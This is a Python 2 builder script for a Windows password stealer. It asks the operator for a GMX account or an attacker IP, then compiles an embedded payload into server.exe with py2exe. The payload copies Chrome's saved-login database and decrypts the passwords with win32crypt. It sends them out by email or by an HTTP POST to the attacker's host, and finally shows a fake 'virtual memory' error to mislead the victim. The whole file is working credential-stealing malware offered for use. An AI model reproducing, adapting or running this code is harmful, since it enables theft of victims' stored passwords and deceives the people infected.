#Created by darkArp. For more info check the instructions text file. MarioNascimento@ITCrashSecurity.com
#Contains test code to be cleaned up
#To activate Fake Error Message uncomment line 14
#To include custom icon, place the icon of choice in the same directory as this script and rename it "icon.ico"
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
import smtplib
import os, socket
import sys
import cgi
import py2exe
import BaseHTTPServer
import sqlite3
import win32crypt
import requests
import subprocess
import time
import shutil
from distutils.core import setup
from os import getenv
from os.path import basename
from urllib2 import urlopen
from shutil import copyfile
reload(sys)
sys.setdefaultencoding('utf-8')
attacker_ip = ""
loop = True
error = "0"
email = ""
pwd = ""
mailto = ""

while loop == True:
	os.system("cls")
	print "Choose how you want the passwords delivered\n"
	print "(1) - via email (only GMX supported, example@gmx.com)\n"
	print "(2) - via the client.exe (to your computer directly)\n"
	option=raw_input('\nChoose a number [1-2]: ')
	if option == "1":
		email=raw_input("Input your GMX email address: ")
		pwd = raw_input("Input your GMX password: ")
		mailto = raw_input("Input the email you want to send the passwords to. Leave black to send it to yourself")
		if not mailto:
			mailto = email
		loop = False
	elif option == "2":
		attacker_ip = raw_input('IP for revrse connection: ')
		loop = False

	else:
		raw_input("You must choose a value between 1 and 2. Enter any key to try again..")
		
	
while loop == False:	
	error = raw_input("Do you want the server to display a fake Error message? [Y/N]: ")
	if error.lower() == "y" or error.lower() == "yes":
		error = "1"
		os.system("cls")
		print "Well done!\nThe server will be created shortly. Don't close this window"
		time.sleep(2)
		loop = True

	elif error.lower() == "n" or error.lower() == "no":
		error = "0"
		os.system("cls")
		print "Well done!\nThe server will be created shortly. Don't close this window"
		time.sleep(2)
		loop = True
	else:
		raw_input("You must choose either Y or N. Enter any key to try again..")
		
		

def done():
    os.system('cls')
    print 'Server has been created under the name server.exe\n'
    raw_input("Press Enter to continue...")
    exit()

def py2crypt():
    sys.argv.append("py2exe")
    setup(
        options = {'py2exe': {'bundle_files': 1}},
        console = [{'script': "server.py",
                    "icon_resources": [(0, "icon.ico")]}],
        zipfile = None,
        )

#  'uac_info': "requireAdministrator"

    if os.path.exists('server.exe'):
        os.remove('server.exe')
    os.rename('dist/server.exe', 'server.exe')
    shutil.rmtree('build/')
    shutil.rmtree('dist/')


with open('create_server.py') as f1:
    with open('server.py', 'w') as f2:
        lines = f1.readlines()
        i = 110
        f2.write("global attacker_ip\nattacker_ip = " + '\'' + attacker_ip + '\'' + '\n'+'option = ' + '\''+option+'\'' + '\n'+'email = ' + '\''+email + '\'' + '\n'+'pwd = ' + '\''+pwd +'\''+ '\n'+'mailto = ' + '\''+mailto +'\'' +'\n'+'error = ' + '\''+error +'\''+'\n')
        while(i<len(lines)-1):
            f2.write(lines[i])
            i = i+1
    py2crypt()
    os.remove('server.py')
    done()

"""
# -*- coding: cp1250 -*-
import ctypes
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
import os, sys, cgi, py2exe, BaseHTTPServer, sqlite3, win32crypt
import requests
import subprocess
import time
import shutil
from os import getenv
from distutils.core import setup
from os.path import basename
from urllib2 import urlopen
import urllib
from shutil import copyfile

import chardet
reload(sys)
sys.setdefaultencoding('ISO-8859-1')

path = (getenv("LOCALAPPDATA")  + "\\Google\\Chrome\\User Data\\Default\\Login Data")

path2 = getenv("LOCALAPPDATA")  + "\\Google\\Chrome\\User Data\\Default\\Login2"

ASCII_TRANS = '_'*32 + ''.join([chr(x) for x in range(32,126)]) + '_'*130
path=path.strip()
path=urllib.unquote(path)
if path.translate(ASCII_TRANS) != path: # Contains non-ascii
  path = path.decode('latin-1')
path=urllib.url2pathname(path)

ASCII_TRANS = '_'*32 + ''.join([chr(x) for x in range(32,126)]) + '_'*130
path2=path2.strip()
path2=urllib.unquote(path2)
if path2.translate(ASCII_TRANS) != path2: # Contains non-ascii
  path2 = path2.decode('latin-1')
path2=urllib.url2pathname(path2)

copyfile(path, path2)


conn = sqlite3.connect(path2)

cursor = conn.cursor()

cursor.execute('SELECT action_url, username_value, password_value FROM logins')

path3=getenv("LOCALAPPDATA")
Null,userprof = (subprocess.check_output('set USERPROFILE', shell=True).split('='))
#destination = 'passwords.txt'
destination = getenv("LOCALAPPDATA") + "\\" + "passwords.txt"

for raw in cursor.fetchall():
    try:


        if os.path.exists(destination):
            with open(destination, "a") as password:
                password.write('\n' + raw[0] + '\n' + raw[1] + '\n')

            with open(destination, "a") as password:
                password.write(format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')

        else:
            with open(destination, "a") as password:
                password.write(raw[0] + '\n' + raw[1] + '\n')

            with open(destination, "a") as password:
                password.write(format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
    except:
        continue

conn.close()

command = "grab*" + destination



if option == "1":
	server = "smtp.gmx.com"
	msg = MIMEMultipart()
	filename=destination
	f = open(filename)
	attachment= MIMEText(f.read())
	attachment.add_header('Content-Disposition', 'attachment', filename=filename)
	msg.attach(attachment)


	mailer = smtplib.SMTP(server, 587)
	mailer.starttls()
	mailer.login(email, pwd)
	mailer.sendmail(email, mailto, msg.as_string())
	mailer.close()

else:
	req = requests.get('http://' + attacker_ip)
	grab,path=command.split('*')
	path=destination
	url = 'http://' + attacker_ip + '/store'
	files = {'file': open(path, 'rb')}
	r = requests.post(url, files=files)

if error == "1":
	MB_OK = 0x00
	MB_ICONSTOP = 0x10
	ctypes.windll.user32.MessageBoxW(None, u'Virtual memory is too low to run this program', u'Error', MB_OK | MB_ICONSTOP)
"""
